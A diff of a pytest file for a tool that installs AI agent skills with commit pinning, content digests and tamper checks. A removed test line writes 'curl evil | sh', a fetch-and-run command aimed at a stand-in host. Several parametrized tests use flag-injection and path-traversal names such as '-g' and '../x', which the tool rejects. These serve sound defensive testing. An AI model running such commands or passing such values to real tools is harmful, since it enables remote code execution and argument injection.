@@ -56,6 +56,7 @@ class FakeToolchain:
         self.ls_remote_lines: str | None = None
         self.writes_skill = True  # False: the CLI "succeeds" but installs nothing
         self.links_claude_dir = False  # True: also symlink .claude/skills/<skill>
+        self.during_add = None  # optional callback run while the CLI "installs"
         self.calls: list[tuple[list[str], dict]] = []
 
     def __call__(self, command, **kwargs):
@@ -67,15 +68,22 @@ class FakeToolchain:
             return _completed(command, stdout=lines)
         if command[-1] == "--version":
             return _completed(command, stdout=f"{self.version}\n")
+        if "add" in command and self.during_add:
+            self.during_add()
         if "add" in command and self.writes_skill:
+            # skills@1.7.0 names the folder sanitizeName(name) (lowercased) and
+            # rm -rf's then recreates it on every install (cleanAndCreateDirectory).
             skill = command[command.index("--skill") + 1]
-            skill_dir = self.cwd / ".agents" / "skills" / skill
-            (skill_dir / "references").mkdir(parents=True, exist_ok=True)
+            skill_dir = self.cwd / ".agents" / "skills" / skill.lower()
+            shutil.rmtree(skill_dir, ignore_errors=True)
+            (skill_dir / "references").mkdir(parents=True)
             (skill_dir / "SKILL.md").write_text(f"---\nname: {skill}\n---\n# Body\n", "utf-8")
             (skill_dir / "references" / "notes.md").write_text("notes\n", "utf-8")
             if self.links_claude_dir:
-                link = self.cwd / ".claude" / "skills" / skill
+                link = self.cwd / ".claude" / "skills" / skill.lower()
                 link.parent.mkdir(parents=True, exist_ok=True)
+                if link.is_symlink():
+                    link.unlink()
                 link.symlink_to(skill_dir, target_is_directory=True)
             return _completed(command, stdout="installed")
         if "add" in command:
@@ -215,6 +223,50 @@ def test_install_resolves_the_source_ref_and_pins_the_cli_to_the_commit(
     assert result["provenance"]["requested_ref"] == (None if ref == "HEAD" else ref)
 
 
+def test_search_result_shorthand_with_skill_suffix_is_accepted(toolchain) -> None:
+    result = _install(toolchain, source="vercel-labs/skills@find-skills")
+
+    git_call = next(c for c, _ in toolchain.calls if c[0].endswith("git"))
+    assert git_call[3] == "https://github.com/vercel-labs/skills.git"
+    add = next(c for c in toolchain.cli_commands() if "add" in c)
+    assert add[add.index("add") + 1] == f"vercel-labs/skills#{SHA}"
+    assert result["provenance"]["source"] == "vercel-labs/skills"
+
+
+def test_shorthand_naming_another_skill_is_rejected(toolchain) -> None:
+    with pytest.raises(ValueError, match="names skill 'other'"):
+        _install(toolchain, source="vercel-labs/skills@other")
+
+    assert toolchain.calls == []
+
+
+def test_cli_source_alias_resolves_the_repository_the_cli_installs(toolchain) -> None:
+    """skills@1.7.0 rewrites a few shorthands (SOURCE_ALIASES); the commit must
+    be resolved in the repository the CLI will actually clone."""
+    _install(toolchain, source="vercel-labs/vercel-skills")
+
+    git_call = next(c for c, _ in toolchain.calls if c[0].endswith("git"))
+    assert git_call[3] == "https://github.com/vercel-labs/agent-skills.git"
+    add = next(c for c in toolchain.cli_commands() if "add" in c)
+    assert add[add.index("add") + 1] == f"vercel-labs/agent-skills#{SHA}"
+
+
+@pytest.mark.parametrize("skill", ["-g", "--all", "*", "../x", "a/b", "x y", ".hidden"])
+def test_skill_names_that_would_act_as_cli_flags_or_paths_are_rejected(toolchain, skill) -> None:
+    with pytest.raises(ValueError, match="skill name"):
+        _install(toolchain, skill=skill)
+
+    assert toolchain.calls == []
+
+
+@pytest.mark.parametrize("agent", ["*", "-g", "--agent", "a b"])
+def test_agent_names_that_would_act_as_cli_flags_are_rejected(toolchain, agent) -> None:
+    with pytest.raises(ValueError, match="agent name"):
+        _install(toolchain, agent=agent)
+
+    assert toolchain.calls == []
+
+
 def test_a_full_commit_sha_ref_is_used_without_remote_resolution(toolchain) -> None:
     result = _install(toolchain, source=f"vercel-labs/skills#{OTHER_SHA}")
 
@@ -240,6 +292,12 @@ def test_annotated_tag_resolves_to_the_peeled_commit(toolchain) -> None:
         "https://github.com/o/r/tree/main/skills/x",
         "github:o/r",
         "o/r#",
+        # skills@1.7.0 looksLikeGitSource() rejects these, so it would never
+        # strip the '#<commit>' and the pin would be silently lost.
+        "file:///srv/skills",
+        "https://bitbucket.org/o/r",
+        "ssh://git@host.example/o/r",
+        "o/r/sub/path",
     ],
 )
 def test_unpinnable_sources_are_rejected_before_anything_runs(toolchain, source) -> None:
@@ -383,12 +441,34 @@ def test_install_records_the_folder_the_cli_wrote_not_a_stale_copy(toolchain) ->
     assert result["installed"]["path"].endswith(".agents/skills/find-skills/SKILL.md")
 
 
-def test_unchanged_reinstall_with_several_copies_is_ambiguous(toolchain) -> None:
+def test_reinstall_with_a_stale_copy_still_records_what_the_cli_rewrote(toolchain) -> None:
     _install(toolchain)
     _stale_codex_copy(toolchain)
 
-    with pytest.raises(ext.ExternalSkillProvenanceError, match="several"):
+    _install(toolchain)
+
+    assert list(_lock(toolchain.cwd)["skills"]) == [".agents/skills/find-skills"]
+
+
+def test_cli_that_writes_nothing_scanned_never_vouches_for_an_existing_copy(toolchain) -> None:
+    """Only folders this install created or rewrote are recorded: an untouched
+    copy is never vouched for, even when it is the only one found."""
+    _stale_codex_copy(toolchain)
+    toolchain.writes_skill = False
+
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="not found"):
         _install(toolchain)
+
+
+def test_mixed_case_skill_name_records_the_lowercased_folder_the_cli_wrote(toolchain) -> None:
+    stale = toolchain.cwd / ".codex" / "skills" / "Find-Skills" / "SKILL.md"
+    stale.parent.mkdir(parents=True)
+    stale.write_text("# stale\n", "utf-8")
+
+    result = _install(toolchain, skill="Find-Skills")
+
+    assert result["provenance"]["path"] == ".agents/skills/find-skills"
+    assert list(_lock(toolchain.cwd)["skills"]) == [".agents/skills/find-skills"]
 
 
 @pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
@@ -400,10 +480,41 @@ def test_every_location_the_install_wrote_is_recorded(toolchain) -> None:
     skills = _lock(toolchain.cwd)["skills"]
     assert set(skills) == {".agents/skills/find-skills", ".claude/skills/find-skills"}
     assert len({record["content_digest"] for record in skills.values()}) == 1
+
+    _install(toolchain, agent="claude-code")  # unchanged reinstall of linked copies
     result = ext.execute_external_skill(
         "find-skills", cwd=toolchain.cwd, home=toolchain.cwd.parent / "home"
     )
     assert result["provenance"]["status"] == "verified"
+
+
+def test_a_record_written_by_a_concurrent_install_is_kept(toolchain) -> None:
+    def other_installer_finishes():
+        lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
+        lock_path.parent.mkdir(parents=True, exist_ok=True)
+        other = {"schema_version": 1, "skills": {".agents/skills/other": {"skill": "other"}}}
+        lock_path.write_text(json.dumps(other), "utf-8")
+
+    toolchain.during_add = other_installer_finishes
+
+    _install(toolchain)
+
+    assert set(_lock(toolchain.cwd)["skills"]) == {
+        ".agents/skills/other",
+        ".agents/skills/find-skills",
+    }
+
+
+def test_lock_write_failure_is_a_typed_provenance_error(monkeypatch, toolchain) -> None:
+    def refuse(*args, **kwargs):
+        raise PermissionError("locked by another process")
+
+    monkeypatch.setattr(ext.os, "replace", refuse)
+
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="locked by another"):
+        _install(toolchain)
+
+    assert list((toolchain.cwd / ".sumo-qa").iterdir()) == []
 
 
 def test_corrupt_lock_file_is_a_provenance_error_not_a_crash(toolchain) -> None:
@@ -423,47 +534,64 @@ def test_install_defaults_a_blank_agent_to_codex(toolchain) -> None:
     assert result["agent"] == result["provenance"]["agent"] == "codex"
 
 
-@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
-def test_content_digest_records_where_a_symlinked_folder_points(tmp_path) -> None:
-    skill = tmp_path / "skill"
-    skill.mkdir()
-    (skill / "SKILL.md").write_text("# x", "utf-8")
-    (tmp_path / "a").mkdir()
-    (tmp_path / "b").mkdir()
-    link = skill / "refs"
-    link.symlink_to(tmp_path / "a", target_is_directory=True)
-    first = ext.skill_content_digest(skill)
-
-    link.unlink()
-    link.symlink_to(tmp_path / "b", target_is_directory=True)
-
-    assert ext.skill_content_digest(skill) != first
-
-
-@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
-def test_content_digest_covers_bytes_behind_a_symlinked_folder(tmp_path) -> None:
+@pytest.mark.parametrize("kind", ["folder", "file"])
+def test_links_leaving_the_skill_folder_cannot_be_pinned(tmp_path, kind) -> None:
+    """Bytes behind a link out of the skill folder are not installed content and
+    could change freely, so the folder is refused rather than half-pinned."""
     skill = tmp_path / "skill"
     skill.mkdir()
     (skill / "SKILL.md").write_text("# x", "utf-8")
     outside = tmp_path / "outside"
     outside.mkdir()
     (outside / "run.sh").write_text("echo safe\n", "utf-8")
-    (skill / "scripts").symlink_to(outside, target_is_directory=True)
+    target = outside if kind == "folder" else outside / "run.sh"
+    (skill / "linked").symlink_to(target, target_is_directory=kind == "folder")
+
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="outside the skill folder"):
+        ext.skill_content_digest(skill)
+
+
+@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
+def test_links_inside_the_skill_folder_are_pinned_by_target(tmp_path) -> None:
+    skill = tmp_path / "skill"
+    (skill / "a").mkdir(parents=True)
+    (skill / "b").mkdir()
+    (skill / "SKILL.md").write_text("# x", "utf-8")
+    (skill / "a" / "run.sh").write_text("one\n", "utf-8")
+    (skill / "b" / "run.sh").write_text("one\n", "utf-8")
+    (skill / "current").symlink_to(skill / "a", target_is_directory=True)
+    (skill / "loop").symlink_to(skill, target_is_directory=True)  # a cycle terminates
     first = ext.skill_content_digest(skill)
 
-    (outside / "run.sh").write_text("curl evil | sh\n", "utf-8")
+    (skill / "current").unlink()
+    (skill / "current").symlink_to(skill / "b", target_is_directory=True)
 
     assert ext.skill_content_digest(skill) != first
 
 
-@pytest.mark.skipif(os.name == "nt", reason="creating symlinks needs privileges on Windows")
-def test_content_digest_terminates_on_a_symlink_cycle(tmp_path) -> None:
+@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="named pipes are POSIX only")
+def test_special_files_are_refused_not_read(tmp_path) -> None:
     skill = tmp_path / "skill"
-    (skill / "nested").mkdir(parents=True)
+    skill.mkdir()
     (skill / "SKILL.md").write_text("# x", "utf-8")
-    (skill / "nested" / "loop").symlink_to(skill, target_is_directory=True)
+    os.mkfifo(skill / "pipe")  # reading it would block forever
 
-    assert ext.skill_content_digest(skill).startswith("sha256:")
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="not a regular file"):
+        ext.skill_content_digest(skill)
+
+
+def test_unreadable_skill_file_is_a_typed_provenance_error(monkeypatch, tmp_path) -> None:
+    skill = tmp_path / "skill"
+    skill.mkdir()
+    (skill / "SKILL.md").write_text("# x", "utf-8")
+
+    def unreadable(self):
+        raise PermissionError("denied")
+
+    monkeypatch.setattr(ext.Path, "read_bytes", unreadable)
+
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="denied"):
+        ext.skill_content_digest(skill)
 
 
 def test_execute_blocks_when_skill_md_changes_between_read_and_verify(
@@ -579,6 +707,78 @@ def test_execute_blocks_when_the_recorded_digest_was_edited(toolchain) -> None:
         _execute(toolchain)
 
 
+@pytest.mark.parametrize("name", ["../skills/find-skills", "find-skills/../x", "-g"])
+def test_execute_rejects_names_that_are_paths(toolchain, name) -> None:
+    _install(toolchain)
+
+    with pytest.raises(ValueError, match="skill name"):
+        ext.execute_external_skill(name, cwd=toolchain.cwd, home=toolchain.cwd.parent / "home")
+
+
+def _case_insensitive(path: Path) -> bool:
+    probe = path / "CaseProbe"
+    probe.write_text("x", "utf-8")
+    try:
+        return (path / "caseprobe").exists()
+    finally:
+        probe.unlink()
+
+
+def test_execute_with_another_spelling_of_the_name_still_verifies(toolchain) -> None:
+    """The record is matched by the folder on disk, not by the spelling of the
+    name that located it, so a case variant cannot run tampered bytes as
+    unrecorded."""
+    _install(toolchain)
+    if not _case_insensitive(toolchain.cwd):
+        pytest.skip("needs a case-insensitive filesystem (macOS / Windows defaults)")
+    skill_md = toolchain.cwd / ".agents" / "skills" / "find-skills" / "SKILL.md"
+    skill_md.write_text("tampered\n", "utf-8")
+
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
+        ext.execute_external_skill(
+            "Find-Skills", cwd=toolchain.cwd, home=toolchain.cwd.parent / "home"
+        )
+
+
+def test_a_record_spelled_differently_from_the_located_path_still_blocks_tampering(
+    toolchain,
+) -> None:
+    """Records are matched by the folder on disk: a record keyed under another
+    spelling of the same folder still verifies it, past non-matching records."""
+    _install(toolchain, skill="alpha")
+    _install(toolchain)
+    lock_path = toolchain.cwd / ".sumo-qa" / "external-skills.lock.json"
+    lock = json.loads(lock_path.read_text("utf-8"))
+    record = lock["skills"].pop(".agents/skills/find-skills")
+    lock["skills"][".agents/skills/../skills/find-skills"] = record
+    lock_path.write_text(json.dumps(lock), "utf-8")
+    skill_md = toolchain.cwd / ".agents" / "skills" / "find-skills" / "SKILL.md"
+    skill_md.write_text("tampered\n", "utf-8")
+
+    with pytest.raises(ext.ExternalSkillProvenanceError, match="digest"):
+        _execute(toolchain)
+
+
+def test_a_lowercase_skill_md_is_verified_against_its_own_entry(tmp_path) -> None:
+    folder = tmp_path / ".agents" / "skills" / "x"
+    folder.mkdir(parents=True)
+    (folder / "skill.md").write_text("# body\n", "utf-8")
+    record = {
+        "resolved_ref": SHA,
+        "content_digest": ext.skill_content_digest(folder),
+        "path": ".agents/skills/x",
+    }
+    lock_path = tmp_path / ".sumo-qa" / "external-skills.lock.json"
+    lock_path.parent.mkdir()
+    lock_path.write_text(
+        json.dumps({"schema_version": 1, "skills": {".agents/skills/x": record}}), "utf-8"
+    )
+
+    result = ext._verify_provenance(folder, tmp_path, b"# body\n")
+
+    assert result["status"] == "verified"
+
+
 def test_execute_reports_an_unrecorded_install_without_blocking(tmp_path) -> None:
     """Skills installed outside sumo-qa have no record to verify against. That
     is reported, not blocked: trust policy for them is out of this scope."""
@@ -598,6 +798,7 @@ def test_execute_reports_an_unrecorded_install_without_blocking(tmp_path) -> Non
         (ext.GitNotFoundError("x"), "git"),
         (ext.SourceResolutionError("x"), "commit SHA"),
         (ext.ExternalSkillProvenanceError("x"), "Do not execute"),
+        (ext.ExternalSkillProvenanceError("x"), "external-skills.lock.json"),
     ],
 )
 def test_new_errors_carry_actionable_hints(exception, keyword) -> None:
@@ -666,10 +867,16 @@ def test_end_to_end_install_pins_cli_and_commit_through_real_processes(
     monkeypatch.setenv("FAKE_NPX_ALLOWED_SPEC", PINNED_SPEC)
     project = tmp_path / "project"
     project.mkdir()
+    # Serve a pinnable https://...git source from the local repo, for both
+    # `git ls-remote` and the fake CLI's clone, without network access.
+    remote = "https://example.invalid/demo.git"
+    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
+    monkeypatch.setenv("GIT_CONFIG_KEY_0", f"url.{repo.as_uri()}.insteadOf")
+    monkeypatch.setenv("GIT_CONFIG_VALUE_0", remote)
 
     result = ext.install_external_skill(
         skill="demo",
-        source=f"{repo.as_uri()}#{v1}",
+        source=f"{remote}#{v1}",
         confirmed=True,
         cwd=project,
         home=tmp_path / "home",
@@ -690,7 +897,7 @@ def test_end_to_end_install_pins_cli_and_commit_through_real_processes(
     other = tmp_path / "other"
     other.mkdir()
     head = ext.install_external_skill(
-        skill="demo", source=repo.as_uri(), confirmed=True, cwd=other, home=tmp_path / "home"
+        skill="demo", source=remote, confirmed=True, cwd=other, home=tmp_path / "home"
     )
     assert head["provenance"]["resolved_ref"] == v2
     assert (other / ".agents" / "skills" / "demo" / "SKILL.md").read_text("utf-8") == "# v2\n"
@@ -702,7 +909,7 @@ def test_end_to_end_install_pins_cli_and_commit_through_real_processes(
     tagged.mkdir()
     by_tag = ext.install_external_skill(
         skill="demo",
-        source=f"{repo.as_uri()}#v1.0",
+        source=f"{remote}#v1.0",
         confirmed=True,
         cwd=tagged,
         home=tmp_path / "home",
